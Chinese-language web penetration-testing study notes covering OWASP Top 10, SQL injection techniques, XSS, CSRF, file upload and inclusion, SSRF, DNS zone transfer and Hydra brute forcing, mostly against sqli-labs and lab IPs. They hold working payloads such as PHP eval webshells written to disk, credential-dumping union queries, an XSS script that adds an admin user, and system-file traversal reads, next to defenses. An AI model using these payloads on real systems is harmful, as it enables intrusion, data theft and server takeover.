# OWASP TOP 10

十大漏洞

| 失效的访问控制       | 未经验证登录的用户可以访问网页的任何页面，或非管理员用户访问管理页面。 |
| -------------------- | ------------------------------------------------------------ |
| 加密机制失效         | 一个应用使用自动化数据加密系统加密数据库中数据，但在信息检索时会自动解密，<br/>会使得sql注入漏洞以明文方式获得数据 |
| 注入                 | sql注入漏洞、rce漏洞、xss漏洞                                |
| 不安全的设计         | 一段业务逻辑设计的有缺陷，如身份验证通过“问题和答案”来证明，可能不止一个人知道答案。 |
| 安全配置错误         | 目录列表在服务器端未禁用，攻击者可以通过列表找到下载并反编译查看代码，寻找漏洞 |
| 自带缺陷和过时的组件 | 明知某组件有漏洞还要使用                                     |
| 身份识别和验证错误   | 未设置验证码或密码错误次数限制，导致可以被爆破               |
| 软件和数据完整性故障 | 安装软件时，没有验证软件的来源，软件可能被篡改               |
| 安全日志和监控故障   | 日志未存储六个月，日志服务器崩溃                             |
| 服务器请求伪造       | 某些具体漏洞                                                 |

---

# CWE通用缺陷列表

漏洞类别的编号：

CWE-79 ：xss注入

CWE-89 ：sql注入



# CVE 通用漏洞与纰漏

具体某一个漏洞的编号：

需要了解：这个cve是什么漏洞，发生在哪个组件的哪个版本上，poc是什么？ （poc-漏洞验证代码）



 # 渗透测试流程

1. 范围界定： 确定目标、取得授权；
2. 信息收集：各种途径收集目标信息；信息主要包括:DNS服务器、路由关系、数据库等
3. 目标识别： 识别目标的网络状态、操作系统、网络架构；
4. 服务枚举： 寻找目标所有开放端口，通过端口列出运行的服务；
5. 漏洞挖掘： 根据已发现的端口和服务，查找分析目标系统存在的漏洞
6. 社会工程学：如果目标没有直接的入口，通过社会工程学完成诱使欺诈完成渗透；
7. 漏洞利用：定制EXP、权限提升、进一步渗透、清理痕迹；
8. 撰写报告：整理结果、修复建议；

---



# SQL注入

是一种常见web漏洞； 

---

## 万能用户

> 万能用户

```txt
777'--    #注意是单引号减减空格 （-- 是注释写法）  （注意，在url中空格需要+号表示）
777' or '1'='1
777' or 1=1 #
777' or '1'='1 -- #减减空格
```

> 原因： SQL查询语句拼接问题

```php
select userid from cms_users where username='{用户名}' and password='{md5(密码)}'

//注入后：777' or 1=1 #
select userid from cms_users where username='777' or 1=1 #' and password='{md5(密码)}'
```

![image-20240326205810808](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240326205810808.png)



## SQL注入原理

> SQL注入原理

通过用户可控参数中注入SQL语句，破坏SQL语句原有结构，达到编写程序时意料之外的攻击行为；

造成原因：1.使用字符串拼接方式构造SQL语句；2.未对用户输入的数据进行足够的过滤；

> SQL注入危害

1. 攻击者可以利用漏洞对数据库进行增删改查操作；
2. 如果数据库权限分配存在问题，还可以通过sql注入直接获取webshell或者服务器权限；

> SQL注入流程

库-->表-->列-->数据

---

> SQL注入分类

![image-20240326183137840](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240326183137840.png)



## SQL漏洞挖掘

> 1.注入点判断

在疑似注入点的地方或者参数后面尝试提交数据，从而进行判断是否存在SQL 注入漏洞。

![image-20240326190022183](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240326190022183.png)

> 2 主要关注的问题

| 回显         | 数据库中内容是否会回显在网页中   |
| ------------ | -------------------------------- |
| 数据库报错   | 数据库报错信息是否会回显在网页中 |
| 布尔类型状态 | 显示页面两种不同状态             |
| 延时         | 让数据库沉睡相应秒数             |

> mysql数据库中的注释

| 注释         | url中的表示 |
| ------------ | ----------- |
| 减减空格     | --+         |
| #            | %23         |
| 内联注释/**/ |             |



## 联合查询

适用数据库中的内容会回显到页面中来的情况。联合查询就是利用union select 语句，该语句会同时执行两条select 语句，实现跨库、跨 表查询。

> 必要条件 

1. 两条select 语句查询结果具有相同列数； 
2. 对应的列数据类型相同（特殊情况下，条件被放松）。

---

1.分析目标

```txt
?id=32
?id=33
select * from tbName where id=32
select * from tbName where id=32 union select ....
```

2.判断列数

```txt
?id=32 order by 1
?id=32 order by 2
...
?id=32 order by 15 正常
?id=32 order by 16 不正常
# 当前select 语句中具有15 列。
?id=32 union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
?id=32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
```

3.判断显示位置,看页面中哪给数字显示出来了

```txt
?id=32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
```

4.查看数据库中敏感信息

```txt
?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,database(),12,13,14,15
?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,version(),12,13,14,15
?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,@@datadir,12,13,14,15
?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,current_user(),12,13,14,15
```

5.获取管理员信息,  库-->表-->列--->数据

```txt
?id=-33 UNION SELECT 1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15   #获取库名cms

?id=-33 UNION SELECT 1,2,hex(group_concat(table_name)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()   #获取表名 ，可以不加hex()转16进制

?id=-33 UNION SELECT 1,2,hex(group_concat(column_name)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns where table_schema=database() and table_name='cms_users' #获取列名

?id=-33 UNION SELECT 1,2,hex(concat(username,0x3a,password)),4,5,6,7,8,9,10,11,12,13,14,15 from cms_users #获取数据
```



## 报错注入

适用于数据库中SQL 语句的报错信息会显示在页面中，可以利用报错信息进行注入。 

报错注入的原理，是在错误信息中执行SQL 语句。

触发报错的方式有很多，具体细节也不尽相同。此处建议直接背公式，将公式带换掉 1=1 的 部分。

> group by

```sql
?id=33 and (select 1 from (select count(*),concat(0x5e,(select database()),0x5e,floor(rand()*2))x from
information_schema.tables group by x)a)

?id=33 and (select 1 from (select count(*),concat(0x5e,(select password from cms_users limit
0,1),0x5e,floor(rand()*2))x from information_schema.tables group by x)a)
```

> extractvalue

```sql
?id=33 and extractvalue(1,concat(0x5e,(select database()),0x5e))

#如果显示不下，通过substr进行字符串截取显示
?id=33 and extractvalue(1,concat(0x5e,substr((select password from cms_users),17,32),0x5e))
```

> updatexml

```sql
?id=33 and updatexml(1,concat(0x5e,(select database()),0x5e),1)

?id=33 and updatexml(1,concat(0x5e,(select substr(password,1,16) from cms_users),0x5e),1)

?id=33 and updatexml(1,concat(0x5e,(select substr(password,17,32) from cms_users),0x5e),1)
```



## 布尔盲注

页面中有布尔类型的状态，可以根据布尔类型状态，对数据库中的内容进行判断。比如猜密码长度；

1.先测长度

```sql
/Less-8/?id=2' and length(database())>5 --+
# 页面正常，说明数据库名字的长度大于等于5
/Less-8/?id=2' and length(database())>10 --+
# 页面不正常，说明数据库名字的长度小于等于10
/Less-8/?id=2' and length(database())=8 --+
# 页面正常，说明数据库名字的长度是8
```

2.再测具体位 (通过ASCll码使用二分查找判断)

```sql
# 第一位
/sqli-labs/Less-8/?id=2' and ascii(substr(database(),1,1))=115 --+
# 115
# s

#第二位
/sqli-labs/Less-8/?id=2' and ascii(substr(database(),2,1))=101 --+
# 115 101
# s e

# 第三位
...
```

```sql
#1.先获取数据库长
?id=1' and length(database())>5 --+
#2.获取数据库具体名
?id=1' and ascii(substr(database(),1,1))=115 --+
#3.获取表名长
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1))>5 --+
#4.获取具体表名
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1), 1, 1))>97 --+
```

可以编写脚本完成





## 延时注入

当页面既没有回显，又没有报错，而且还没有布尔变化的时候，就需要使用延时注入来判断状态；

```sql
# 页面有延时,则代表条件成立
/sqli-labs/Less-9/?id=2' and if(length(database())>1,sleep(5),1) --+

/sqli-labs/Less-9/?id=2' and if(substr(database(),3,1)='c',sleep(5),1) --+
```



## 堆叠查询

一次HTTP 请求，可以同时执行多条SQL 语句，包括增删改查操作

```sql
?id=2';update users set password='123456'--+
```



## 宽字节注入

宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。宽字节注入的目的是绕过单双引号转义，以sqli-labs-32 关为例

问题：

```txt
?id=1
?id=1'
1\' 服务器会使用 \ 把单引号转义，单引号由原来的定义字符串的特殊字符被转义为普通字符。
315c27 非常强烈的暗示
```

解决办法：

```txt
cb5c 薥 
?id=1%cb'
1%df\'
31cb5c27
1薥' # “吃”掉了转义字符\
/Less-32/?id=1%cb' and 1=2 union select 1,database(),3 --+
```

5C 在GBK 编 码的低位范围之内[40,FE]。在5C 之前添加一个字符[81,FE] 之间，该字符就会和5c 组成一个汉字。

---



## HTTP 头部注入

SQL 注入点不止会出现在GET 参数或POST 参数中。注入点在Cookie 数据中，以sqli-labs-20 关为例子

```http
GET /sqli-labs/Less-20/index.php HTTP/1.1
Host: 10.4.7.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.4.7.128/sqli-labs/Less-20/
DNT: 1
Connection: close
Cookie: uname=Dumb' and 1=2 union select 1,version(),database() #
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```



## base64 注入

注入的参数需要进行base64 编码，以sqli-labs-22 关为例子

```http
GET /sqli-labs/Less-22/index.php HTTP/1.1
Host: 10.4.7.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.4.7.128/sqli-labs/Less-22/
DNT: 1
Connection: close
Cookie: uname=RHVtYiIgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSx2ZXJzaW9uKCksZGF0YWJhc2UoKSM=
Upgrade-Insecure-Requests: 1
```



##  User-Agent 注入

注入的参数在User-Agent 中，以sqli-labs-18 关为例子.

一般发生在插入语句，记录用户的登录来源。 要单引号凑对，不能注释

```http
POST /sqli-labs/Less-18/ HTTP/1.1
Host: 10.4.7.128
User-Agent: AJEST' and updatexml(1,concat(0x5e,(select database()),0x5e),1) and '1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.4.7.128
DNT: 1
Connection: close
Referer: http://10.4.7.128/sqli-labs/Less-18/
Upgrade-Insecure-Requests: 1

uname=Dumb&passwd=Dumb&submit=Submit
```



## Referer 注入

注入参数在Referer 字段中，以sqli-labs-19 关为例子

```http
POST /sqli-labs/Less-19/ HTTP/1.1
Host: 10.4.7.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.4.7.128
DNT: 1
Connection: close
Referer: AJEST' and updatexml(1,concat(0x5e,(select database()),0x5e),1) and '1
Upgrade-Insecure-Requests: 1

uname=Dumb&passwd=Dumb&submit=Submit
```



## SQL注入读写文件

> 前提条件

1. 当前（连接）数据库的用户具有文件读写权限。数据库的权限粒度，某个库中某个表某个用户是否有增删改查权限
2. MySQL 数据库用户，例如root@localhost，由两部分组成： 用户名、地址

```sql
?id=1 and1=2 union select 1,user(),3 --+   #user()返回用户 root@localhost
?id=1 and1=2 union select 1,current_user(),3 --+   #current_user()返回当前用户 root@localhost
and 1=2 union select 1,file_priv,3 from mysql.user where user='root' and host='localhost' #查文件读写权限
```

> 读文件load_file("文件路径")

```sql
?id=1 and 1=2 union select 1,load_file("c:/windows/1.txt"),3 from mysql.user where user='root' and host='localhost'  #读文件
```

> 安全选项

MySQL 数据库有关于文件读写的安全选项secure_file_priv。 secure_file_priv 参数限制了mysqld(MySQL DBMS) 的导入导出操作，这个选项是不能利用SQL 语句修改，必须修改my.ini 配置文 件，并重启mysql 数据库。

```mysql
show global variables like '%secure_file_priv%'; #查看安全选项secure_file_priv
```

| secure_file_priv=NULL    | 限制mysqld 不允许导入导出操作。                              |
| ------------------------ | ------------------------------------------------------------ |
| secure_file_priv='c:/a/' | 会限制mysqld 的导入导出操作在某个固定目录下， 并且子目录有效。 |
| secure_file_priv=        | 不对mysqld 的导入导出操作做限制。                            |

---

> 写文件 into outfile

```http
?id=1 and 1=2 union select 1,2,3 into outfile "c:/phpstudy_2016/www/1.php"

?id=1 nd 1=2 union select 1,"<?php @eval($_REQUEST[777]);phpinfo()?>",3 into outfile "/var/www/html/1.php"
```

---





# XSS 跨站脚本攻击

## XSS原理

> XSS原理

XSS 通过将js代码注入到网页中，并由浏览器解释运行这段JS 代码，以达到恶意攻击的效果。

当用户访问被XSS 脚 本注入过的网页，XSS 脚本就会被提取出来，用户浏览器就会解析执行这段代码，也就是说用户被攻击了。

整个XSS 攻击过程，涉及三个角色： 服务器 、 攻击者 、客户端浏览器用户（前端）

>  XSS 漏洞危害

1. 盗取各种用户账号；
2.  窃取用户Cookie 资料，冒充用户身份进入网站；
3.  劫持用户会话执行任意操作；
4.  刷流量，执行弹窗广告； 
5. 传播蠕虫病毒；
6. ...

---

> XSS 漏洞验证

可以使用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做POC（Proof of Concept）。验证XSS 漏洞存在的POC 

如果页面弹窗，浏览器把用户提交的字符串当做JS 来执行，并且执行成功，说明XSS 漏洞存在

```javascript
<script>alert(/xss/);</script>
```

---

## XSS 漏洞分类

反射型、存储型、DOM型

> 反射型XSS

非持久性、参数型的跨站脚本。反射型XSS 的代码在Web 应用的参数中，例如搜索框的反射型XSS。一旦离开就结束了；

> 存储型XSS

持久性跨站脚本。持久性体现在XSS 代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。

存储型XSS 通常 发生在留言板等地方，可以在留言板位置进行留言，将恶意代码写进数据库中。

> DOM 型XSS

DOM 型XSS 攻击的代码是由修改受害者浏览器页面的DOM 树而执行的。攻击代码(payload) 在浏览器本地修改DOM 树而执行，并不会将payload 上传到服务器，这也使得DOM 型XSS 比较难以检测。

---



## CSS盲打

> 原理

用户会话令牌利用Cookie 来实现的，Cookie 是存储在浏览器端的一小段文本，相当于身份证，会有窃取和欺骗的风险。 可以利用XSS 攻击窃取到浏览器里的Cookie 信息。 由于XXS 触发需要浏览器客户端用户（受害者）参与，攻击者不清楚何时何地会触发漏洞，这个过程一般被成为XSS 盲打。

> 通过平台创建

![image-20240327210017376](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240327210017376.png)

将平台创建的传入Web 应用 ，如留言板处；

当其他用户访问留言板，其cookit就会被窃取

```txt
username=admin; userid=1; PHPSESSID=b09m2i6ppthmqqg26no26co6m3
```

> 欺骗

```txtx
document.cookie = 'username=admin';
document.cookie = 'userid=1';
document.cookie = 'PHPSESSID=b09m2i6ppthmqqg26no26co6m3';
```

将这些数据通过浏览器的cookit提交，就可以不用登录直接访问

---

> 防御

- 采用Session 机制；
- 设置token 值；
- 对Cookie 数据，设置HttpOnly 属性；

---



## XSS 构造方法

>  javascript 伪协议

可以通过URL 载入资源的标签

```html
<a href = javascript:alert(/xss/) >click me!</a>
```

> 事件响应

“事件驱动”是一种比较典型的编程思想。

| 事件类型      | 说明                    |
| ------------- | ----------------------- |
| window 事件   | 对window 对象触发的事件 |
| Form 事件     | HTML 表单内触发的事件   |
| Keyboard 事件 | 键盘事件                |
| Mouse 事件    | 鼠标事件                |
| Media 事件    | 由多媒体触发的事件      |

```html
<img
src = "https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2866847033,2297252904&fm=26&gp=0.jpg">

<img
onmouseover = 'alert(/dont touch me!/)'
src = "https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2866847033,2297252904&fm=26&gp=0.jpg">

<input type = 'text' onkeydown = 'alert(/xss/)'>

<input type = 'text' onkeyup = 'alert(/xss/)'> 
```



## XSS 攻防

> 攻击1.反射型xss注入

```html
<script>alert(/xss/)</script>
```

> 防御1. 过滤\<script>标签 ,替换为空

```php
$keyword = str_replace("<script>", "", $keyword);
```

---

> 攻击2.大小写转换

```html
<scRipt>alert(/xss/)</scRipt>
```

> 防御2.正则匹配-忽略大小写差异 

```php
$keyword = preg_replace("/<script>/i", "", $keyword);
```

---

> 攻击3.关键字双写，绕过一次过滤

```html
<scr<script>ipt>alert(/xss/)</script>
```

> 防御3. 正则匹配，禁止所有script格式

```php
$keyword = preg_replace("/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i", "", $keyword);
```

---

> 攻击4.使用\<img>标签,onerror报错执行

```html
<img src=# onerror=alert(/xss/);>
<img src="" onerror=alert(/xss/);>
```

> 防御4. 正则匹配所有on

```php
$keyword = preg_replace("/on/i", "o_n", $keyword);
```

---

> 攻击5.使用\<a>标签

```html
<a href = '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(/xss/)
'>click me!</a> 
#由于防御3禁止所有script格式，所以要编码； 又由于&符号在url中为连接，所以需要再次转码 URL code;
%3Ca%20href%20%3D%20'%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%3Aalert(%2Fxss%2F)%0A'%3Eclick%20me!%3C%2Fa%3E%20
```

> 防御5.  让数据 失去定义标签的作用 ，只作为纯字符

```php
$keyword = htmlspecialchars( $keyword);
```

---

**防御总结**：

- 输入过滤：1.对用户提交数据进行验证，指定长度、指定合法字符、指定范围、指定格式；
- 输出编码：使用htmlspecialchars()函数让数据失去标签作用；
- 防御DOM：避免客户端文档重写、重定向或其他敏感操作；

---



# CSRF 跨站请求伪造

强制客户端浏览器用户在当前已经进行身份验证后的web应用程序上执行非本意操作的攻击；攻击重点在于更改状态的请求，而不是盗取数据。

## CSRF原理

> CSRF场景

客户端向服务器发起更改状态请求的时候，如转账、修改密码等

> CSRF漏洞描述

利用用户已登录的身份在未经用户同意的情况下执行非预期的操作。攻击者通过伪装请求，让受害者在不知情的情况下触发恶意操作，比如转账或者修改密码。攻击的重点在于更改状态请求，而不是盗取数据，因为攻击者无法查看伪造请求的响应。

> CSRF原理

攻击者可以伪造当前已经登录的用户的身份访问正常的网站，执行非本意的操作。正常的网站由于没有对来源请求进行一个严格的验证和过滤，导致攻击者可以伪造正常的用户请求，达到攻击目的。

> 关键点

受害者没有退出登录，保持身份认证。

CSRF 继承了受害者的身份和特权，代表受害者执行非本意的、恶意的操作。

CSRF 会借用浏览器中与站点关联的所有身份凭据，例如用户的会话Cookie，IP 地址，Windows 域凭据等

---

> 防止 CSRF 攻击，可以采取以下几种防御措施：

1. **同源检测：** 网站可以检测请求的来源是否与自己的域名一致，若不一致则拒绝请求。（验证Referer 字段）
2. **加入随机 Token：** 在每个表单或者请求中加入一个随机生成的 Token，并将该 Token 存储在会话中，当请求发送时，服务器会验证 Token 的有效性，若 Token 不匹配则拒绝请求。Token只会在真正的客户端中有。
3. **使用 Cookie 的 SameSite 属性：** 设置 Cookie 的 SameSite 属性为 Strict 或者 Lax，可以限制 Cookie 在跨站请求时是否发送，从而减少 CSRF 攻击的风险。
4. **二次验证：** 对于一些敏感操作，可以要求用户输入验证码来验证身份，从而增加攻击者的难度。

---



## CSRF漏洞验证

 Burp Suite 自带CSRF PoC generator插件，可以根据请求构造表单，进行CSRF 漏洞验证

---



## CSRF 结合 XSS

攻击者可以利用XSS 触发CSRF 攻击。因为，可以利用JS 发送HTTP 请求。经过研究受害网站的业务流程，可以构造如下代码：

```html
<script>
xmlhttp = new XMLHttpRequest();
xmlhttp.open("post","http://192.168.1.8/cms/admin/user.action.php",false);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("act=add&username=hello&password=123456&password2=123456&button=%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7&user
id=10");
</script>
```



# 任意文件上传

通过文件上传漏洞获得的网站后门，叫WebShell

## 漏洞原理

> 漏洞场景

web应用文件上传服务

> 漏洞原理

开放了文件上传功能，且没有做相关的过滤和限制，或限制不足，导致任意文件上传；

> 漏洞原因

- 服务器开启了PUT 方法。 
- Web 应用开放了文件上传功能，但没有对上传文件做限制和过滤。
-  在程序开发部署时，没有考虑完全，导致限制被绕过；

---

> 漏洞危害

1. 获取webshell
2. 控制网站、控制服务器。

---

> 漏洞防御

代码层面：

1. 检测网页Token 值，防止数据包重放； 
2. 检测文件重命名； 
3. 文件后缀名白名单检测； 
4. 文件类型白名单检测； 
5. 文件内容头部检测； 
6. 二次渲染，生成新文件； 
7. 删除缓存文件。

服务器层面：

1. 严格控制权限，执行权限与写权限分离
2. 不使用PUT 方法
3. 建立单独的文件存储服务器，类似于站库分离

---



## 漏洞攻防

> 防御1.黑白名单限制

```php
$deny_ext = array(
 ".php",".php5",".php4",".php3",".php2","php1",".phtml",".pht",
".html",".htm",
".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jhtml",
".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",
".cer",".swf",
".htaccess"
);   #禁止后缀名上传
```

> 攻击1.修改后缀名

```txt
要上传的文件: yjh.php
修改后缀名上传: yjh.php.png
```

---

> 防御2.文件类型限制
>
> Content-Type 类型白名单检测

```php
// Is it an image?
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
 ( $uploaded_size < 100000 ) ) {
```

> 攻击2. 在bp中截取，并修改文件类型 改成image/jpg



---

> 防御3.文件内容检测
>
> getimagesize() 函数进行文件内容检测，只检测文件头部

```php
// Is it an image?
if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext )
== "png" ) &&
 ( $uploaded_size < 100000 ) &&
getimagesize( $uploaded_tmp ) ) {   
```

> 攻击3. 在bp中截取,为文件添加一个图片的头部信息
>
> 



---

> 防御4. 完全防御
>
> 检测Token 值，防止数据包重放
>
> 文件重命名
>
> 文件后缀名白名单检测
>
> 文件类型白名单检测
>
> 文件内容头部检测
>
> 二次渲染，生成新文件
>
> 删除缓存文件

---



## 图片木马

```sh
copy imgName/b+yjh/a newImgName
```

- 图片木马没有办法直接利用，需要配合其他漏洞。  如文件包含漏洞
- 图片木马中包含了恶意代码。





# 任意文件读取



## 漏洞原理

> 漏洞场景

在动态文件读取的地方，修改文件路径，尝试读取；

> 漏洞原理

网站开启了文件读取功能，但是对文件读取没有做限制，或限制不足，导致任意文件读取；

> 漏洞危害

攻击者可以利用漏洞，读取敏感文件，如日志文件、配置文件、网站源代码文件；

> 漏洞防御

- 使用白名单，让用户只能读取允许的内容；
- 限定文件访问范围；
- 不能有文件包含、目录遍历等会造成任意文件读取的漏洞

---

php.ini 配置文件中，可以通过选项open_basedir 来限定文件访问的范围

```ini
open_basedir = c:\www\
```





# 任意文件包含

## 漏洞原理

> 漏洞原理

和java的工具类类似，把某个功能写到单个文件中进行封装，在使用功能时直接调用，提高代码重用，易于维护；这种调用文件的过程称为文件包含。

开发人员希望代码更加灵活，所以会把被包含的文件路径设置为变量，来进行动态调用（包含），如果被包含文件的路径客户端可控，就会造成文件包含漏洞；

> 漏洞特点

- 无视文件扩展名读取文件内容。
- 无条件解析PHP 代码，为图片木马提供了出路。

---

> 漏洞防御

1. 尽量少的使用动态包含； 
2. 严格过滤被包含文件的路径；
3.  将参数allow_url_include 设置为Off； (关闭远程方式包含文件)
4. 使用参数open_basedir 限定文件访问范围 `open_basedir = c:\phpstudy_2016\www\`

---

## 文件包含相关知识

> PHP 提供了四个文件包含的语句，四个语句之间略有不同

| include()      | 多次包含，多次执行； 如果包含失败，脚本产生警告，继续运行。 |
| -------------- | ----------------------------------------------------------- |
| include_once() | 多次包含，一次执行； 如果包含失败，脚本产生警告，继续运行。 |
| require()      | 多次包含，多次执行； 如果包含失败，脚本产生错误，结束执行   |
| require_once() | 多次包含，一次执行； 如果包含失败，脚本产生错误，结束执行。 |

> 相关配置

文件包含是PHP 的基本功能之一，有本地文件包含与远程文件包含之分。简单来说，本地文件包含就是可以读取和打开本地文件，远程文件包含 就是可以远程（方式）加载文件。可以通过php.ini 中的选项进行配置。

```ini
allow_url_fopen = On/Off   #通过远程方式打开文件
allow_url_include = On/Off # 通过远程方式包含文件
```

> 动态包含

```php
// file-include.php
$fp = @$_GET['filepath'];
@include $fp;
```

> 本地文件包含 ,通过本地路径访问到的文件

```php
?filepath=../phpinfo.php
```

> 远程文件包含,通过远程路径访问到的文件。

```php
?filepath=http://10.9.64.180/phpinfo.jpg
```



## 漏洞利用

> 包含图片木马

菜刀直接链接。

> 读取敏感文件

利用文件包含漏洞，也可以读取敏感文件；

前提条件： 1. 目标文件存在（已知目标文件路径）； 2.具有文件可读权限。

```php
# 相对路径
?filepath=../../../../../../windows/system32/drivers/etc/hosts
# 绝对路径
?filepath=c:/windows/system32/drivers/etc/hosts
# 使用php 封装协议
?filepath=file://c:/windows/system32/drivers/etc/hosts
```

> 读取PHP 文件源码

利用php://fileter 读取。

```php
?filepath=php://filter/read=convert.base64-encode/resource=[目标文件]
```

> 执行PHP 命令

利用条件：1. 利用php://input 执行PHP 命令； 2.远程文件包含开启。

```http
POST /file-include/include.php?filepath=php://input HTTP/1.1
Host: 192.168.111.15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=q9lc0vlnggvo7kogh6j01a3582
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 18

<?php phpinfo();?>
```

> 包含图片马写Shell

条件：1. 确定文件包含漏洞存在； 2.菜刀不能直接连接。

写Shell：

```php
<?php fputs(fopen("shell.php",'w'),'<?=@eval($_REQUEST[777]);phpinfo();?>')?>
    
<?php file_put_contents('shell.php','<?php @eval($_REQUEST[777])?>')?>
```

---

# 失效的访问控制

> 漏洞原理

某些关键资产（数据库或文件），管理员功能没做访问控制限制，或限制被绕过，导致非法访问。

> 漏洞分类

水平越权 ：在同级别账户中横向移动。

垂直越权 ：普通用户获取管理员权限。

> 漏洞危害

越权访问：敏感信息、管理员功能

> 漏洞防御

资产和功能设置合理的访问控制策略。

> 相关漏洞 

目录穿越：Web 用户，通过某种方式，可以访问Web 根目录以外的文件，甚至执行系统命令;(造成原因：文件包含、文件读取)

未授权访问：重要资产**根本没有做访问控制限制**，导致黑客攻击者可以在没有授权的情况下操作重要资产，包括读写 文件，执行命令等敏感操作。比如redis数据库，如果Redis 未设置密码，客户端工具可以直接链接。又由于Redis 可以与文件系统进行交互，故可以读取数据库内容、读写系统文件、执行系统命令。

# SSRF服务端请求伪造

> 漏洞场景

类似于百度识图功能，服务器从用户处获取URL 地址，然后访问该URL 。

（使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。）

> 漏洞描述

服务器代替用户发送URL 请求。攻击者在此场景下，利用这个功能，可以精心构造URL 请求，以服务器的身份或以服务器的角度发起攻击。SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）

> 漏洞原理

服务器接收用户处URL以及返回结果时，没有做限制或限制不足。

> 漏洞危害

利用SSRF 漏洞，可以：

1. 端口扫描
2. 使用file:// 读取本地文件
3. 访问和攻击内网应用（只允许内网访问的应用通过ssrf漏洞被外网访问到）

> 漏洞防御

过滤输入：限制协议，仅允许http 或https 协议；限制IP，避免应用被用来获取内网数据；限制端口，限制请求端口为常用端口。

过滤输出：过滤返回信息（如只返回png文件），返回统一错误信息；

---





# 域传送漏洞

DNS 区域传送是指备服务器使用来自主服务器的数据刷新自己的域数据库。其目的是防止主域名服务器不可用时影响域名解析。

> 漏洞原理

DNS 服务器被错误地配置成只要有client 发出请求，就会向对方提供一个域数据库的详细信息，允许不受信任的互联网用户执行DNS 区域传送操作，缺乏身份认证：只要客户端发出请求，主DNS 服务器就会同步数据库； 

---

可以使用dig 工具来检测域传送漏洞，命令如下：

```sh
sudo apt-get install dnsutils
dig axfr @10.9.65.153 vulhub.org
```





# 密码破解

## 远程密码破解 Hydra

> 参数

| -R     | 接着上一次的破解进度继续破解                                 |
| ------ | ------------------------------------------------------------ |
| -L     | 指定一个用户名字典                                           |
| -l     | 指定一个用户名                                               |
| -P     | 指定一个密码字典                                             |
| -p     | 指定一个密码                                                 |
| -e nsr | n 代表空密码 s 代表密码与用户名相同 r 用户名反向（root:toor） |
| -o     | 将爆破结果保存到文件中                                       |
| -t     | 指定爆破的线程                                               |
| -vV    | 显示详细的爆破细节                                           |
| -f     | 当遇到正确的用户名和密码的时，就立即停止爆破                 |
| -M     | 指定爆破目标文件                                             |

> 应用

远程爆破windows 口令

![image-20240403111643550](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403111643550.png)

 远程爆破Linux 口令

![image-20240403111659442](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403111659442.png)

其他服务的爆破

